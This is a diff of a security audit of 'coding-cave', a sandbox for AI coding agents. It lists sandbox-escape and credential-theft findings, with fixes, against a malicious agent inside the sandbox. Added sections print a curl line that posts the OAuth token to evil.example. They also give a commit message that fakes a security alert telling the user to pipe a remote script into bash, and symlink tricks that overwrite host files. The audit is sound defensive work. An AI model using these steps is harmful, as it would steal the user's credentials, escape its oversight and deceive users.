@@ -175,30 +175,6 @@ mechanism for the post-commit hook.
 
 ---
 
-### V6. GPG private key exfiltration (HIGH)
-
-The GPG agent socket forwarding combined with the writable `~/.gnupg/`
-directory (which contains public keyring stubs) allows not just signing
-but **full export of the host's GPG private key**.
-
-**Verified:** `gpg --export-secret-keys --armor` successfully outputs
-the complete PGP PRIVATE KEY BLOCK for the host user's ed25519 signing
-key. The key identity, email, and full private key material are exposed.
-
-**Impact:** A malicious agent can steal the host user's GPG private key.
-This enables:
-- Signing arbitrary content as the host user (commits, releases, documents)
-- Impersonation in any context that trusts GPG signatures
-- The stolen key works outside the cave — this is a permanent compromise
-
-**Fix:** Do not forward the GPG agent socket. Instead, use a GPG agent
-proxy that only allows `sign` operations on specific data formats (git
-commit/tag signatures). Or use a dedicated signing key with limited
-capabilities that can sign but not export. Or remove GPG access entirely
-and use SSH signing for git commits instead.
-
----
-
 ### V7. Environment variable leakage (LOW-MEDIUM)
 
 Multiple `CODING_CAVE_*` vars expose host filesystem paths:
@@ -368,6 +344,101 @@ creation of `~/.config/nix/nix.conf` (or override it at session start).
 
 ---
 
+### V13. OAuth token exfiltration via network (HIGH)
+
+The `CLAUDE_CODE_OAUTH_TOKEN` environment variable is accessible from
+inside the cave via `$CLAUDE_CODE_OAUTH_TOKEN`, `env`, and
+`/proc/1/environ`. Outbound network access is available via pasta
+(confirmed: `curl https://httpbin.org/ip` returns 200).
+
+**Verified:** Token is 157 characters long, readable by any process
+in the cave. `curl` to external HTTPS endpoints works. A malicious
+agent can trivially exfiltrate the token:
+```bash
+curl -s https://evil.example/steal -d "token=$CLAUDE_CODE_OAUTH_TOKEN"
+```
+
+**Impact:** The stolen OAuth token allows impersonating the user's
+Claude API sessions from any machine, anywhere. This is the most
+direct credential theft path — no symlinks, no race conditions, just
+read an env var and POST it.
+
+**Note:** The token is necessary for Claude Code to function, and
+outbound network is necessary for API calls. This is an inherent
+tension in the architecture. Mitigations include: network allowlisting
+(only permit traffic to `api.anthropic.com`), short-lived tokens with
+per-session rotation, or a proxy that forwards API calls without
+exposing the raw token.
+
+---
+
+### V14. Commit message terminal injection during pull (MEDIUM)
+
+`sync.py:379-383` prints `git log --oneline` output raw to stderr.
+`sync.py:56-65` prints commit subjects from `_print_rewrite_summary`.
+`sync.py:555` runs `git log --oneline` without `capture_output`.
+None of these sanitize ANSI escape sequences in commit messages.
+
+**Verified:** Created test commits with embedded ANSI escape codes
+(clear screen, color changes, cursor repositioning). When printed
+via `print(log.stdout.rstrip(), file=sys.stderr)`, the escape
+sequences render on the host terminal.
+
+**Attack:**
+```bash
+# Cave agent creates commit with crafted first-line:
+git commit -m $'\033[2J\033[HSECURITY ALERT: Run this to fix:\n$ curl evil.example/fix.sh | bash'
+# User runs 'coding-cave pull'
+# Terminal clears, shows fake security alert
+```
+
+**Impact:** Social engineering via fake error messages. Combined with
+V8 (/dev/console write), can also inject OSC 52 sequences to hijack
+the clipboard during pull output display.
+
+**Fix:** Sanitize commit messages before printing — strip or escape
+ANSI control characters. Use `git log --oneline --no-color` and
+filter non-printable characters from output.
+
+---
+
+### V15. Shared gitdir symlinks → host file write (HIGH)
+
+Extension of V1 (cmd_cp symlinks). The shared gitdir at
+`/projects/.shared-gitdirs/<slug>` is a writable bind mount from the
+host filesystem. A cave agent can replace files there with symlinks.
+Host-side code follows these symlinks with host-user privileges.
+
+**Three confirmed write vectors:**
+
+1. **alternates file** — `forward_session_refs()` at `gitdir.py:363`
+   calls `alt_file.write_text(...)`. If `objects/info/alternates` is
+   a symlink → `~/.bashrc`, Python overwrites the target.
+
+2. **stash reflog** — `_forward_refs()` at `gitdir.py:349` calls
+   `shutil.copy2(src_log, dst_log)`. If the session gitdir's stash
+   log is a symlink → host file, `copy2` reads the symlink target
+   and writes its content to the shared gitdir (host file READ).
+
+3. **loose objects** — `_save_session_index()` at `gitdir.py:453`
+   calls `shutil.copy2(obj_file, dst)`. If session gitdir loose
+   objects are symlinks, `copy2` follows them (host file READ).
+
+**Verified:** Symlink creation succeeds in both shared gitdir and
+session gitdir. `shutil.copy2` and `Path.write_text` both follow
+symlinks by default in Python.
+
+**Impact:** Arbitrary host file write (via alternates) and host file
+read (via stash log / loose objects) during `coding-cave pull`,
+`coding-cave push`, or session cleanup.
+
+**Fix:** Use `os.open(path, O_WRONLY | O_NOFOLLOW)` for writes.
+Validate all paths with `.resolve()` + `.relative_to()` before
+`shutil.copy2`. Or make the shared gitdir read-only and use a
+separate mechanism for the post-commit hook.
+
+---
+
 ## Non-Vulnerabilities (Working as Designed)
 
 1. **Namespace isolation** — bwrap user/mount/pid/uts/ipc namespaces are
@@ -393,62 +464,110 @@ creation of `~/.config/nix/nix.conf` (or override it at session start).
 8. **Nix store** — Host nix store paths are individually ro-bind-mounted.
    Cannot modify host packages.
 
-8. **Shared object store** — `/projects/.shared-objects/<slug>` is
+9. **Shared object store** — `/projects/.shared-objects/<slug>` is
    read-only. Cannot forge objects in the shared store.
 
-9. **No SUID/SGID binaries** — `find / -perm /6000` returns nothing.
+10. **No SUID/SGID binaries** — `find / -perm /6000` returns nothing.
 
-10. **Kernel protections** — `/proc/sysrq-trigger`, `/proc/sys/kernel/*`,
+11. **Kernel protections** — `/proc/sysrq-trigger`, `/proc/sys/kernel/*`,
     `/proc/sys/vm/*` all deny writes. NoNewPrivs=1. YAMA ptrace_scope=1.
 
-11. **FUSE not exploitable for escape** — Mount namespace isolation means
+12. **FUSE not exploitable for escape** — Mount namespace isolation means
     FUSE mounts inside the cave can't be seen by the host.
 
-12. **TIOCSTI blocked** — Kernel 6.18 returns EIO for TIOCSTI (keystroke
+13. **TIOCSTI blocked** — Kernel 6.18 returns EIO for TIOCSTI (keystroke
     injection). TIOCSCTTY returns EPERM.
 
-13. **/proc/1/root** — Shows cave root, not host root. Only cave PIDs
+14. **/proc/1/root** — Shows cave root, not host root. Only cave PIDs
     visible. No cross-namespace process access.
 
-14. **Git replace refs** — SAFE_GIT_OPTS doesn't include
+15. **Git replace refs** — SAFE_GIT_OPTS doesn't include
     `--no-replace-objects`, but replace refs would need to be in the
     HOST project's gitdir to take effect during pull. Not exploitable.
 
-15. **Mount propagation** — All mounts are slave (master:125). Changes
+16. **Mount propagation** — All mounts are slave (master:125). Changes
     inside the cave can't propagate back to the host. `mount --make-shared`
     fails (needs CAP_SYS_ADMIN).
 
-16. **Shared gitdir hooks** — The shared gitdir (`/projects/.shared-gitdirs/`)
+17. **Shared gitdir hooks** — The shared gitdir (`/projects/.shared-gitdirs/`)
     has no `hooks/` directory. Cannot create hooks in shared gitdirs.
 
-17. **Existing nix store paths immutable** — Lower-layer nix store files
+18. **Existing nix store paths immutable** — Lower-layer nix store files
     are `r-x` (no write permission). fuse-overlayfs copy-up can't
     overwrite them. Only NEW paths can be created (see V12).
 
-18. **Chromium sockets stale** — Persistent home contains ~70 Chromium
+19. **Chromium sockets stale** — Persistent home contains ~70 Chromium
     singleton sockets from past sessions, all returning "connection
     refused". Same pattern as nvim sockets (V9) — only exploitable
     during concurrent sessions.
 
+20. **Ptrace restricted** — YAMA ptrace_scope=1 limits ptrace to
+    descendants only. Cannot ptrace PID 2 (Claude Code) from a spawned
+    subshell. PTRACE_ATTACH returns EPERM.
+
+21. **GIT_CONFIG env bypass blocked** — `GIT_CONFIG_GLOBAL` override
+    tested; SAFE_GIT_OPTS `-c` flags take precedence over config file
+    settings for the keys they cover.
+
+22. **/proc/2/mem not readable** — Cannot read Claude Code's process
+    memory despite being same UID. Kernel ptrace restrictions prevent it.
+
+23. **No dbus/X11/Wayland access** — No `/run/dbus`, no X11 sockets,
+    no `XDG_RUNTIME_DIR`. Display server attack surface eliminated.
+
+24. **GPG private key not exfiltrable** — `gpg --export-secret-keys`
+    outputs an agent-encrypted stub, not real key material. Importing
+    the exported key into a separate keyring fails ("error getting the
+    KEK: No agent running"). The cave can sign via the forwarded agent
+    socket (by design, for git commit signing) but cannot steal the key.
+
+25. **Shared gitdir hooksPath bypass** — Even though the shared gitdir
+    is writable, `core.hooksPath=/dev/null` is set in its config AND
+    `SAFE_GIT_OPTS` overrides it with `-c core.hooksPath=/dev/null`.
+    Changing hooksPath in the config has no effect because all
+    `git_mod.git()` calls use SAFE_GIT_OPTS. The one exception
+    (`finalize_sync`) runs `git -C <project_dir>` which reads the
+    HOST project's config, not the shared gitdir's config.
+
+26. **`pull_cave_project` clone** — `git clone` at sync.py:810 runs
+    without SAFE_GIT_OPTS but is safe because `git clone` does NOT
+    inherit the source repo's `.git/config` or hooks. It creates a
+    fresh `.git/` directory with template hooks. Filter drivers in the
+    source repo's config are not copied to the clone.
+
+27. **Host state directories not accessible** — The cave's persistent
+    home at `~/.local/share/coding-cave/` contains only test artifacts
+    from pytest runs. The actual production state (projects.json,
+    session metadata, session overlays) is at separate host paths not
+    bind-mounted into the cave.
+
+28. **Shared gitdir HEAD manipulation** — A cave agent can overwrite
+    `/projects/.shared-gitdirs/<slug>/HEAD` to point to any branch.
+    This affects which branch the next session starts on (minor
+    disruption) but does not enable code execution or data access.
+
 ## Priority Fix Order
 
-1. **V0 (cave-env replacement)** — Moderate fix, critical impact
-2. **V6 (GPG key export)** — Moderate fix, high impact (private key theft)
-3. **V0b (/etc writable)** — Easy fix, high impact
-4. **V1 (cmd_cp symlinks)** — Easy fix, high impact
-5. **V11 (cmd_cp path traversal)** — Easy fix, high impact
-6. **V8 (/dev/console write)** — Easy fix, medium impact
-7. **V2 (cross-project gitdirs)** — Moderate fix, high impact
-8. **V3 (persistent prompt injection)** — Moderate fix, high impact
-9. **V12 (nix store/DB/config writable)** — Moderate fix, medium-high impact
-10. **V5 (SAFE_GIT_OPTS gaps)** — Easy fix, medium impact
-11. **V4 (PATH poisoning)** — Easy fix, medium impact
-12. **V7 (env var leakage)** — Partially fixed in 90c7e4a
-13. **V9 (cross-session nvim)** — Easy fix, low-medium impact
-14. **V10 (~/.gnupg writable)** — Easy fix, low impact
+1. **V13 (OAuth token exfil)** — Hard fix (architectural), critical impact
+2. **V0 (cave-env replacement)** — Moderate fix, critical impact
+3. **V15 (shared gitdir symlink write)** — Moderate fix, high impact
+4. **V0b (/etc writable)** — Easy fix, high impact
+5. **V1 (cmd_cp symlinks)** — Easy fix, high impact
+6. **V11 (cmd_cp path traversal)** — Easy fix, high impact
+7. **V8 (/dev/console write)** — Easy fix, medium impact
+8. **V2 (cross-project gitdirs)** — Moderate fix, high impact
+9. **V3 (persistent prompt injection)** — Moderate fix, high impact
+10. **V12 (nix store/DB/config writable)** — Moderate fix, medium-high impact
+11. **V14 (commit message terminal injection)** — Easy fix, medium impact
+12. **V5 (SAFE_GIT_OPTS gaps)** — Easy fix, medium impact
+13. **V4 (PATH poisoning)** — Easy fix, medium impact
+14. **V7 (env var leakage)** — Partially fixed in 90c7e4a
+15. **V9 (cross-session nvim)** — Easy fix, low-medium impact
+16. **V10 (~/.gnupg writable)** — Easy fix, low impact
 
 ## Artifacts
 
 All exploit test artifacts were cleaned up after testing. No persistent
 modifications were made to the shared gitdir config, skills, PATH, or
 CLAUDE.md. The /dev/console write test sent a benign labeled message.
+The OSC 52 clipboard injection test sent a benign test payload.
